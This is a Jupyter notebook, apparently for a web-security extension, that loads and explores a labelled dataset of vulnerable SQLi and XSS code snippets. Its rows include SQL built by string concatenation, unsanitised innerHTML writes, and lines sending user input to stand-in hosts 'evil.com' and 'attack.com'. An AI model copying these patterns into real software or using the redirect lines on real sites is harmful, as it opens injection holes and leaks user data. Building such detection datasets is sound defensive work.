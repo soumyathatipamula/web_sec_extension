{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Code Vulnerabilities csv"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 735,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 736,
   "metadata": {},
   "outputs": [],
   "source": [
    "code_vul = pd.read_csv(\"../Datasets/code_vulnerabilities.csv\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 737,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Code Snippet",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Vulnerability Type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Location",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Preprocessed Tokens",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "a8b6677a-ae19-416c-aabe-453cb703fc5f",
       "rows": [
        [
         "0",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "8",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "1",
         "alert('Hello ' + user_input);",
         "XSS",
         "19",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "2",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "3",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "14",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "4",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "17",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "5",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "10",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "6",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "7",
         "alert('Hello ' + user_input);",
         "XSS",
         "16",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "8",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "13",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "9",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "13",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "10",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "10",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "11",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "12",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "12",
         "db.execute('SELECT * FROM employees WHERE id = ' + user_input)",
         "SQLi",
         "6",
         "[\"db.execute('SELECT\", '*', 'FROM', 'employees', 'WHERE', 'id', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "13",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "19",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "14",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "3",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "16",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "5",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "17",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "10",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "18",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "1",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "20",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "20",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "8",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "21",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "20",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "22",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "16",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "23",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "5",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "25",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "13",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "26",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "11",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "27",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "7",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "28",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "15",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "29",
         "connection.query('SELECT * FROM users WHERE username = ' + input_string)",
         "SQLi",
         "9",
         "[\"connection.query('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'input_string)']"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "12",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "6",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "32",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "12",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "33",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "9",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "35",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "20",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "36",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "10",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "37",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "7",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "38",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "2",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "39",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "6",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "40",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "5",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "41",
         "alert('Hello ' + user_input);",
         "XSS",
         "3",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "42",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "16",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "43",
         "db.execute('SELECT * FROM products WHERE product_id = ' + product_input)",
         "SQLi",
         "12",
         "[\"db.execute('SELECT\", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', \"'\", '+', 'product_input)']"
        ],
        [
         "44",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "11",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "17",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "46",
         "query = 'SELECT * FROM customers WHERE email = ' + email_input",
         "SQLi",
         "3",
         "['query', '=', \"'SELECT\", '*', 'FROM', 'customers', 'WHERE', 'email', '=', \"'\", '+', 'email_input']"
        ],
        [
         "47",
         "alert('Hello ' + user_input);",
         "XSS",
         "1",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "48",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "9",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ],
        [
         "49",
         "cursor.execute('SELECT * FROM users WHERE username = ' + user_input)",
         "SQLi",
         "16",
         "[\"cursor.execute('SELECT\", '*', 'FROM', 'users', 'WHERE', 'username', '=', \"'\", '+', 'user_input)']"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 1000
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Code Snippet</th>\n",
       "      <th>Vulnerability Type</th>\n",
       "      <th>Location</th>\n",
       "      <th>Preprocessed Tokens</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>cursor.execute('SELECT * FROM users WHERE user...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>8</td>\n",
       "      <td>[\"cursor.execute('SELECT\", '*', 'FROM', 'users...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>19</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>document.location = 'http://evil.com?username=...</td>\n",
       "      <td>XSS</td>\n",
       "      <td>2</td>\n",
       "      <td>['document.location', '=', \"'http://evil.com?u...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>14</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>db.execute('SELECT * FROM employees WHERE id =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>17</td>\n",
       "      <td>[\"db.execute('SELECT\", '*', 'FROM', 'employees...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>...</th>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "      <td>...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>995</th>\n",
       "      <td>db.execute('SELECT * FROM products WHERE produ...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>12</td>\n",
       "      <td>[\"db.execute('SELECT\", '*', 'FROM', 'products'...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>996</th>\n",
       "      <td>connection.query('SELECT * FROM users WHERE us...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>9</td>\n",
       "      <td>[\"connection.query('SELECT\", '*', 'FROM', 'use...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>997</th>\n",
       "      <td>alert('Hello ' + user_input);</td>\n",
       "      <td>XSS</td>\n",
       "      <td>16</td>\n",
       "      <td>[\"alert('Hello\", \"'\", '+', 'user_input);']</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>998</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>17</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>999</th>\n",
       "      <td>query = 'SELECT * FROM customers WHERE email =...</td>\n",
       "      <td>SQLi</td>\n",
       "      <td>12</td>\n",
       "      <td>['query', '=', \"'SELECT\", '*', 'FROM', 'custom...</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>1000 rows × 4 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "                                          Code Snippet Vulnerability Type  \\\n",
       "0    cursor.execute('SELECT * FROM users WHERE user...               SQLi   \n",
       "1                        alert('Hello ' + user_input);                XSS   \n",
       "2    document.location = 'http://evil.com?username=...                XSS   \n",
       "3    query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "4    db.execute('SELECT * FROM employees WHERE id =...               SQLi   \n",
       "..                                                 ...                ...   \n",
       "995  db.execute('SELECT * FROM products WHERE produ...               SQLi   \n",
       "996  connection.query('SELECT * FROM users WHERE us...               SQLi   \n",
       "997                      alert('Hello ' + user_input);                XSS   \n",
       "998  query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "999  query = 'SELECT * FROM customers WHERE email =...               SQLi   \n",
       "\n",
       "     Location                                Preprocessed Tokens  \n",
       "0           8  [\"cursor.execute('SELECT\", '*', 'FROM', 'users...  \n",
       "1          19         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "2           2  ['document.location', '=', \"'http://evil.com?u...  \n",
       "3          14  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "4          17  [\"db.execute('SELECT\", '*', 'FROM', 'employees...  \n",
       "..        ...                                                ...  \n",
       "995        12  [\"db.execute('SELECT\", '*', 'FROM', 'products'...  \n",
       "996         9  [\"connection.query('SELECT\", '*', 'FROM', 'use...  \n",
       "997        16         [\"alert('Hello\", \"'\", '+', 'user_input);']  \n",
       "998        17  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "999        12  ['query', '=', \"'SELECT\", '*', 'FROM', 'custom...  \n",
       "\n",
       "[1000 rows x 4 columns]"
      ]
     },
     "execution_count": 737,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "code_vul"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 738,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<class 'pandas.core.frame.DataFrame'>\n",
      "RangeIndex: 1000 entries, 0 to 999\n",
      "Data columns (total 4 columns):\n",
      " #   Column               Non-Null Count  Dtype \n",
      "---  ------               --------------  ----- \n",
      " 0   Code Snippet         1000 non-null   object\n",
      " 1   Vulnerability Type   1000 non-null   object\n",
      " 2   Location             1000 non-null   int64 \n",
      " 3   Preprocessed Tokens  1000 non-null   object\n",
      "dtypes: int64(1), object(3)\n",
      "memory usage: 31.4+ KB\n"
     ]
    }
   ],
   "source": [
    "code_vul.info()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 739,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Location",
         "rawType": "float64",
         "type": "float"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "13d91ee5-c6fe-445e-85c6-2b049db224b9",
       "rows": [
        [
         "count",
         "1000.0"
        ],
        [
         "mean",
         "10.243"
        ],
        [
         "std",
         "5.730339238455939"
        ],
        [
         "min",
         "1.0"
        ],
        [
         "25%",
         "5.0"
        ],
        [
         "50%",
         "10.0"
        ],
        [
         "75%",
         "15.0"
        ],
        [
         "max",
         "20.0"
        ]
       ],
       "shape": {
        "columns": 1,
        "rows": 8
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Location</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>1000.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>10.243000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>5.730339</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>1.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>5.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>10.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>15.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>20.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "          Location\n",
       "count  1000.000000\n",
       "mean     10.243000\n",
       "std       5.730339\n",
       "min       1.000000\n",
       "25%       5.000000\n",
       "50%      10.000000\n",
       "75%      15.000000\n",
       "max      20.000000"
      ]
     },
     "execution_count": 739,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "code_vul.describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 740,
   "metadata": {},
   "outputs": [],
   "source": [
    "xss_code_vul = code_vul[code_vul[\"Vulnerability Type\"] == \"XSS\"]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 741,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.microsoft.datawrangler.viewer.v0+json": {
       "columns": [
        {
         "name": "index",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Code Snippet",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Vulnerability Type",
         "rawType": "object",
         "type": "string"
        },
        {
         "name": "Location",
         "rawType": "int64",
         "type": "integer"
        },
        {
         "name": "Preprocessed Tokens",
         "rawType": "object",
         "type": "string"
        }
       ],
       "conversionMethod": "pd.DataFrame",
       "ref": "48567ec4-3f77-46fb-9439-a11aebc07785",
       "rows": [
        [
         "0",
         "alert('Hello ' + user_input);",
         "XSS",
         "19",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "1",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "2",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "2",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "10",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "3",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "4",
         "alert('Hello ' + user_input);",
         "XSS",
         "16",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "5",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "13",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "6",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "12",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "7",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "10",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "8",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "20",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "9",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "8",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "10",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "20",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "11",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "5",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "12",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "13",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "13",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "14",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "11",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "15",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "15",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "16",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "12",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "17",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "6",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "18",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "3",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "19",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "9",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "20",
         "alert('Hello ' + user_input);",
         "XSS",
         "3",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "21",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "16",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "22",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "17",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "23",
         "alert('Hello ' + user_input);",
         "XSS",
         "1",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "24",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "4",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "25",
         "alert('Hello ' + user_input);",
         "XSS",
         "14",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "26",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "3",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "27",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "19",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "28",
         "alert('Hello ' + user_input);",
         "XSS",
         "5",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "29",
         "alert('Hello ' + user_input);",
         "XSS",
         "7",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "30",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "7",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "31",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "1",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "32",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "2",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "33",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "8",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "34",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "1",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "35",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "18",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "36",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "2",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "37",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "7",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "38",
         "alert('Hello ' + user_input);",
         "XSS",
         "9",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "39",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "5",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "40",
         "document.getElementById('input').innerHTML = user_input;",
         "XSS",
         "2",
         "[\"document.getElementById('input').innerHTML\", '=', 'user_input;']"
        ],
        [
         "41",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "6",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "42",
         "alert('Hello ' + user_input);",
         "XSS",
         "11",
         "[\"alert('Hello\", \"'\", '+', 'user_input);']"
        ],
        [
         "43",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "20",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "44",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "6",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "45",
         "document.location = 'http://evil.com?username=' + user_input;",
         "XSS",
         "15",
         "['document.location', '=', \"'http://evil.com?username='\", '+', 'user_input;']"
        ],
        [
         "46",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "11",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "47",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "9",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ],
        [
         "48",
         "window.location.href = 'http://attack.com?user=' + user_input;",
         "XSS",
         "12",
         "['window.location.href', '=', \"'http://attack.com?user='\", '+', 'user_input;']"
        ],
        [
         "49",
         "document.write('<script src=\"evil.js\"></script>');",
         "XSS",
         "14",
         "[\"document.write('<script\", 'src=\"evil.js\"></script>\\');']"
        ]
       ],
       "shape": {
        "columns": 4,
        "rows": 500
       }
      },
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Code Snippet</th>\n",
